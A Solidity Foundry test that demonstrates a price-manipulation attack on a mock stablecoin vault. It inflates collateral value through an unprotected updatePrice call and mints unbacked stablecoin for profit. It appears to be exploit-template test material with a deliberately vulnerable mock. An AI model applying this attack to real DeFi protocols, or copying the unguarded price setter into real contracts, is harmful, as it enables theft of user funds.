// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockERC20.sol";
import "../src/mocks/MockStable.sol";

/**
 * @title StablecoinPegCollateralSwapTest
 * @notice Proves the `stablecoin_peg_collateral_swap` template inline: after
 *         the manipulable collateral price is inflated, the attacker mints
 *         more stablecoin than the deposited collateral backs.
 */
contract StablecoinPegCollateralSwapTest is Test {
    MockERC20 public stable;
    MockERC20 public colA;
    MockERC20 public colB;
    MockStable public mstable;

    function setUp() public {
        stable = new MockERC20("USDS", "USDS");
        colA = new MockERC20("COL-A", "COLA");
        colB = new MockERC20("COL-B", "COLB");
        mstable = new MockStable(address(stable), address(colA), address(colB));
    }

    function testPegAttack() public {
        // attacker opens a vault with 1000 of cheap collateralB (price 1)
        uint256 id = mstable.openVault();
        colB.mint(address(this), 1000 ether);
        colB.approve(address(mstable), 1000 ether);
        mstable.depositCollateral(id, address(colB), 1000 ether);

        // inflate the collateral price 2x (no access control on updatePrice)
        mstable.updatePrice(1 ether, 2 ether);

        // mint 1300 stable (66% LTV of the inflated 2000 value)
        mstable.mint(id, 1300 ether);

        // attacker profits 300 stable on a 1000 deposit (and keeps collateral)
        assertEq(stable.balanceOf(address(this)), 1300 ether, "minted unbacked stablecoin");
        assertGt(stable.balanceOf(address(this)), 1000 ether, "profit over deposited value");
    }
}
